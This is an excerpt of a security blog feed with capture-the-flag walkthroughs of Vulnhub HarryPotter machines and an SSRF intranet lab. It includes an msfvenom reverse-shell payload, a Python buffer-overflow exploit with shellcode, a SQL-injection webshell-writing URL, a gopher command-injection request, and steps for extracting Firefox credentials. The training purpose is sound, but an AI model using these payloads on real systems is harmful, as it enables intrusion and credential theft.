title="ssrf打mysql未授权"></a>ssrf打mysql未授权</h1><p>发现存在ssrf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111508436.png"></p><p>结合上面拿到的mysql信息,应该就是通过ssrf打mysql了,需要用到gopher协议</p><p>需要用这个工具去构造gopher payload,工具用python2写的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tarunkant/Gopherus.git</span><br><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111551969.png"></p><p>把链接复制放进去,拿到返回结果(没出结果多刷新几次)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111552593.png"></p><p>继续查询</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111554120.png"></p><p>拿到加密密码,但是解不出,我们可以自己写一个密码进去覆盖掉</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111556736.png"></p><p>构造md5密码(踩坑,看了很多csdn上的wp,都是使用这样的方式去获得md5加密的字符串,这样写进数据库是解析不了的,所以一直登录不进后台,md5sum返回的是文件的hash值用来对比文件是否完整),这样加密的字符串,和在线网站加密的对比不一致,使用md5sum返回的字符串放进数据库里是解析不出来的,无法登录,使用在线网站加密的没问题</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111612007.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111639962.png"></p><p>修改密码(解密为password)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111639586.png"></p><p>根据上面扫出的路径,去后台登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111605165.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>增加一个php</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111701510.png"></p><p>在Extensions -&gt; Templates -&gt; Templates可以编辑模板文件,写反弹马子,或者写一句话都行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111704000.png"></p><p>kali监听,访问 url&#x2F;joomla&#x2F;templates&#x2F;protostar&#x2F;shell.php</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111712630.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在家目录找到一串base64密文,解密为Love@lilly</p><p><img src="https://raw.githubuserontent.com/chencicici/images/main/202211111715095.png"></p><p>在另一个家目录发现一个可执行文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111717900.png"></p><p>没有sudo,看一下suid权限,su_cp,根据文件名猜测就是sudo权限的cp命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111724602.png"></p><p>尝试登录一下上面那个用户,登录成功,ssh交互式shell舒服一点</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111727579.png"></p><p>有suid的权限,直接复制ssh key到家目录直接免密登录</p><p>先在kali生公钥,在将公钥复制到snape家目录下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111742676.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111742248.png"></p><p>直接在家目录下新建文件,写入复制的内容,再使用su_cp复制到hermoine用户的ssh目录下(公钥文件权限只能是640)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111743364.png"></p><p>免密登录hermoine用户</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111745644.png"></p><p>在目录下发现一个隐藏文件夹,这个目录里面包含有火狐浏览器的扩展、用户信息，以及保存到账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111750069.png"></p><p>下载firefox信息提取工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/unode/firefox_decrypt.git</span><br></pre></td></tr></table></figure><p>将隐藏文件夹传到kali上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r hermoine@192.168.31.205:/home/hermoine/.mozilla/ /root/ </span><br></pre></td></tr></table></figure><p>然后运行脚本,脚本会自己去找&#x2F;root&#x2F;.mozilla 所以复制过来不需要改密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111757191.png"></p><p>登录成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111801009.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub靶场 &lt;a href=&quot;https://www.vulnhub.com/entry/harrypotter-nagini,689/&quot;&gt;https://www.vulnhub.com/entry/harrypotter-nagini,689/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;攻击机kali：192,168.1.11&lt;/p&gt;
&lt;p&gt;靶机：192.168.1.12&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="HARRYPOTTER系列" scheme="https://syst1m.top/tags/HARRYPOTTER%E7%B3%BB%E5%88%97/"/>
    
    <category term="joomla cms" scheme="https://syst1m.top/tags/joomla-cms/"/>
    
  </entry>
  
  <entry>
    <title>vuln-Fawks打靶</title>
    <link href="https://syst1m.top/2022/11/09/vulnhub-Fawks%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/11/09/vulnhub-Fawks%E6%89%93%E9%9D%B6/</id>
    <published>2022-11-09T10:37:18.000Z</published>
    <updated>2022-11-14T11:02:15.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶场来自 <a href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">https://www.vulnhub.com/entry/harrypotter-fawkes,686/</a></p><p>攻击机：kali 192.168.31.118 靶机：192.168.31.132</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行信息收集</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091841058.png"></p><p>用nmap -A扫描后发现2222也是ssh端口，9898端口无法访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091849583.png"></p><p>先扫描一下路径，什么都没有</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091851116.png"></p><p>回到21端口发现存在匿名用户登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091857014.png"></p><h1 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h1><p>发现一个 文件，下载下来看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091900533.png"></p><p>用cat查看是乱码，用file看看是个什么东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091902718.png"></p><h1 id="缓存区溢出"><a href="#缓存区溢出" class="headerlink" title="缓存区溢出"></a>缓存区溢出</h1><h2 id="缓存区溢出漏洞"><a href="#缓存区溢出漏洞" class="headerlink" title="缓存区溢出漏洞"></a>缓存区溢出漏洞</h2><p> 缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p><p>而缓存区溢出漏洞最重要的就是找出缓存区溢出的位置，这里我们使用edb-debugger调试工具来动态测试server_hogwarts进程并找出缓存区溢出漏洞的溢出位置</p><p>发现是一个elf可执行文件,给一个执行权限执行看看，没有回显</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091903824.png"></p><p>看看进程，到底是个啥东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep server</span><br><span class="line">显示名字包含server的所有进程</span><br><span class="line"> </span><br><span class="line">ss -pantu | grep server</span><br><span class="line">用ss查看已经建立的并且名字带有server的连接信息，ss 命令可以用来获取 socket 信息</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091905651.png"></p><p>发现在本地的9898端口起了一个服务，和最开始nmap扫描出的9898端口一致，暂时不知道用处，监听看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091909034.png"></p><p>输入都无效，到这里思路已经没了，去网上看了公开的<a href="https://blog.csdn.net/qq_63844103/article/details/127275133?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127275133-blog-124653850.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127275133-blog-124653850.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=2">wp</a>  ，打死没想到这里是缓冲区溢出。。。知识盲点</p><h2 id="edb-debugger调试"><a href="#edb-debugger调试" class="headerlink" title="edb-debugger调试"></a>edb-debugger调试</h2><p>edb-debugger是一个跨平台的 AArch32 &#x2F; x86 &#x2F; x86-64 调试器</p><h3 id="关闭防护"><a href="#关闭防护" class="headerlink" title="关闭防护"></a>关闭防护</h3><p>我们是通过ftp服务下载server_hogwarts到本地来调试，目的就是找出它的缓存溢出位置，但是kali本机存在<strong>ALSR安全技术</strong>，地址空间随机化，会造成内存地址的随机化，导致我们无法确定缓冲区溢出的位置。所以要关闭。</p><p>cd到**&#x2F;proc&#x2F;sys&#x2F;kernel<strong>目录下把</strong>randomize_va_space<strong>改成</strong>0**即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091919598.png"></p><h3 id="安装edb-debugger"><a href="#安装edb-debugger" class="headerlink" title="安装edb-debugger"></a>安装edb-debugger</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> update</span><br><span class="line">apt-<span class="built_in">get</span> install edb-debugger</span><br></pre></td></tr></table></figure><p>等跑完选确定</p><h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>前面的端口不要断，打开edb，直接在控制台输入edb</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091927719.png"></p><p>选中刚刚的进程，点击确定</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091928790.png"></p><p>再点击运行，就可以开始调试了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091928869.png"></p><h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>因为我们要来调试缓存区溢出，先构造一些数据，用Python来构造一些脏数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;asd&#x27;*500)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092002131.png"></p><p>粘贴到输入框，发现报错</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092003114.png"></p><p>已经调试到了错误位置，即确实存在代码溢出漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092004775.png"></p><h3 id="寻找溢出位置"><a href="#寻找溢出位置" class="headerlink" title="寻找溢出位置"></a>寻找溢出位置</h3><p>确认了存在缓存区溢出，就需要找到溢出位置，这里不能生成一样的数据，因为需要通过报错来判断溢出位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 500</span><br></pre></td></tr></table></figure><p>重启edb，重复上面的操作，然后将生成的随机字符丢进去</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092023900.png"></p><p> 此时的报错提示我们<strong>0×64413764</strong>内存位置有问题，那这个位置很有可能就是想找的<strong>溢出位置</strong>，我们来找一下这个内存位置在输入区的位置</p><p>查询溢出位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -l 500 -q 64413764</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092026843.png"></p><p> 可以看到<strong>偏移量</strong>为112，所以64413764就是在113个位置</p><p>看别的师傅公开的wp后面的内容真看不懂，直接跳过生成payload</p><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>这个生成的payload就是我们用来放进ESP并执行的<strong>反弹shell代码</strong>，但注意这里需要<strong>16进制</strong>的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.31.118 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092032931.png"></p><p>根据这个payload写一个exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xb8\xd4\xbe\xd2\x98\xd9\xc3\xd9\x74\x24\xf4\x5d\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x45\x12\x03\x45\x12\x83\x39\x42\x30&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6d\xf0\x60\x42\x6d\xa1\xd5\xfe\x18\x47\x53\xe1\x6d&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\xae\x62\x1e\xf4\x80\x5c\xec\x86\xa8\xdb\x17\xee&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x86\x09\xcc\x52\xbe\x33\x0c\xbb\x63\xbd\xed\x0b\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xed\xbc\x38\xb1\x0d\xb6\x5f\x78\x91\x9a\xf7\xed\xbd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x69\x6f\x9a\xee\xa2\x0d\x33\x78\x5f\x83\x90\xf3\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x93\x1c\xc9\x02&quot;</span></span><br><span class="line"> </span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+<span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span>+<span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>+buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.31.132&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure><p>这里connect连接的是靶机的9898端口 </p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>用nc监听本地4444端口，也就是一开始msf生成的payload端口再执行exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 4444</span><br><span class="line">python2 ./exp.py</span><br></pre></td></tr></table></figure><p>收到shell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092039255.png"></p><p>反弹一个半交互式shell，发现没python用bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092043612.png"></p><p>发现一个隐藏文件，发现一串字符串</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092044566.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="容器提权"><a href="#容器提权" class="headerlink" title="容器提权"></a>容器提权</h2><p>目录下这个文件没有执行权，不知道是什么东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092048738.png"></p><p>用刚刚的字符串尝试一下ssh,发现密码错误，但是2222端口还有一个ssh，继续尝试，发现成功登录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">harry</span> HarrYp0tter<span class="variable">@Hogwarts123</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092053518.png"></p><p>发现这个名字，似乎是一个编号，查看ip和我们最开始访问的192.168.31.132不同，似乎是docker容器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092056279.png"></p><p>判断是否为docker环境，进一步确认</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /.dockerenv <span class="comment">#查看是否存dockerrnv文件</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup <span class="comment">#查看系统进程的cgroup信息</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092057159.png"></p><p>继续信息收集，suid和sudo</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092046474.png"></p><p>发现sudo -l 为all，可以直接执行sudo -s拿到root权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092102818.png"></p><p>发现flag和一串提示，意思是有人登录ftp，让我们分析流量</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092103681.png"></p><p>用tcpdump去分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure><p>发现一个账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092107659.png"></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：neville</span><br><span class="line">密码： bL!Bsg3k</span><br></pre></td></tr></table></figure><h2 id="宿主机提权"><a href="#宿主机提权" class="headerlink" title="宿主机提权"></a>宿主机提权</h2><p>尝试登录ssh,22端口应该是宿主机的ssh端口，2222是容器的端口被映射出来</p><p>这里ip正确，是宿主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092109131.png"></p><p>找到第二个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092112207.png"></p><p>提全三板斧，suid sudo 内核均无果，看了wp发现是sudo存在漏洞可以提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092116491.png"></p><p>找到<a href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py">exp</a>,靶机出网就wget，不出网直接复制下来替换sudo路径</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092120149.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092120153.png"></p><p>执行exp</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092122371.png"></p><p>参考来自：这位师傅的wp<a href="https://blog.csdn.net/qq_63844103/article/details/127275133?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127275133-blog-124653850.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127275133-blog-124653850.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=2">链接</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶场来自 &lt;a href=&quot;https://www.vulnhub.com/entry/harrypotter-fawkes,686/&quot;&gt;https://www.vulnhub.com/entry/harrypotter-fawkes,686/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;攻击机：kali 192.168.31.118 靶机：192.168.31.132&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行信息收集&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="HARRYPOTTER系列" scheme="https://syst1m.top/tags/HARRYPOTTER%E7%B3%BB%E5%88%97/"/>
    
    <category term="缓存区溢出" scheme="https://syst1m.top/tags/%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>ssrf打穿内网</title>
    <link href="https://syst1m.top/2022/11/03/ssrf%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/"/>
    <id>https://syst1m.top/2022/11/03/ssrf%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/</id>
    <published>2022-11-03T09:51:47.000Z</published>
    <updated>2022-12-05T06:33:08.724Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看到国光师傅的文章，复现一遍，靶场搭建来自 <a href="https://github.com/Duoduo-chino/ssrf_vul">https://github.com/Duoduo-chino/ssrf_vul</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041403610.png"></p><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041415547.png"></p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="ssrf探测内网端口"><a href="#ssrf探测内网端口" class="headerlink" title="ssrf探测内网端口"></a>ssrf探测内网端口</h2><p>访问首页</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041417378.png"></p><p>用file协议测试ssrf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041418913.png"></p><p>探测内网信息,确定是在内网中，可以对其他网段进行探测</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041439697.png"></p><p>用http协议测试</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041435616.png"></p><p>用dict协议探测内网信息，dict协议一般只能探测出一些带tcp回显的端口，使用bp迭代爆破</p><p>选定爆破变量为d段和端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041447899.png"></p><p>payload1，d段ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041458112.png"></p><p>payload2 常用端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041459036.png"></p><p>爆破出开放端口情况</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041502156.png"></p><p>整理一下（国光师傅给出的端口开放情况），实际这里是docker搭建会有差别，没有探测到3306，靶机也只开放了7个</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.72.23.21</span> - <span class="number">80</span></span><br><span class="line"><span class="number">172.72.23.22</span> - <span class="number">80</span></span><br><span class="line"><span class="number">172.72.23.23</span> - <span class="number">80</span>、<span class="number">3306</span></span><br><span class="line"><span class="number">172.72.23.24</span> - <span class="number">80</span></span><br><span class="line"><span class="number">172.72.23.25</span> - <span class="number">80</span></span><br><span class="line"><span class="number">172.72.23.26</span> - <span class="number">8080</span></span><br><span class="line"><span class="number">172.72.23.27</span> - <span class="number">6379</span></span><br><span class="line"><span class="number">172.72.23.28</span> - <span class="number">6379</span></span><br><span class="line"><span class="number">172.72.23.29</span> - <span class="number">3306</span></span><br></pre></td></tr></table></figure><h2 id="22代码执行"><a href="#22代码执行" class="headerlink" title="22代码执行"></a>22代码执行</h2><p>这里存在一个代码执行，使用http协议用burp去爆破目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041530587.png"></p><p>爆破出phpinfo和一个webshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041519496.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041530860.png"></p><p>拿着webshell执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041532815.png"></p><p>要注意，这里执行命令如果用空格需要用URL编码空格</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041533490.png"></p><p>如果再bp中需要进行两次编码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041535319.png"></p><h2 id="23sql注入"><a href="#23sql注入" class="headerlink" title="23sql注入"></a>23sql注入</h2><p>http协议探测23，直接告诉我们sql注入</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041537788.png"></p><p>抓包注入，这里用&#x2F;**&#x2F;代替空格，可以免去二次url编码，%2523为#的两次编码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071652939.png"></p><p>发现是root尝试直接写webshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071654895.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071716824.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="regexp">//</span><span class="number">172.72</span>.<span class="number">23.23</span><span class="regexp">/?id=1&#x27;/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/1,2,3,&#x27;&lt;?php%2520system($_GET[1]);%2520?&gt;&#x27;/</span>**<span class="regexp">/into/</span>**<span class="regexp">/dumpfile/</span>**<span class="regexp">/&#x27;/</span>var<span class="regexp">/www/</span>html/x.php<span class="string">&#x27;%2523</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071717430.png"></p><h2 id="24命令执行"><a href="#24命令执行" class="headerlink" title="24命令执行"></a>24命令执行</h2><p>很经典的一个rce</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071721953.png"></p><p>但是这里是post发包，要用gopher协议去发包</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071722528.png"></p><p>关于gopher协议详细介绍 <a href="https://www.freebuf.com/articles/web/337824.html">https://www.freebuf.com/articles/web/337824.html</a></p><p>构造一个post数据包，删除这一行，否则会被两次gzip编码</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Accept</span>-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure><p>构造一个简单的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">host</span><span class="punctuation">: </span>172.72.23.24</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">ip</span><span class="operator">=</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="comment">;whoami</span></span></span><br></pre></td></tr></table></figure><p>再将整个数据包用url编码两次，编码两次的数据包就是最终的tcp数据流</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071845620.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="symbol">gopher:</span>//&lt;host&gt;<span class="symbol">:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP</span>数据流&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071844333.png"></p><h2 id="25XXE"><a href="#25XXE" class="headerlink" title="25XXE"></a>25XXE</h2><p>跟命令执行差不多</p><h2 id="26tomcat"><a href="#26tomcat" class="headerlink" title="26tomcat"></a>26tomcat</h2><p>也是一样，URL编码两次以后用gopher协议去发包</p><h2 id="27-Redis未授权"><a 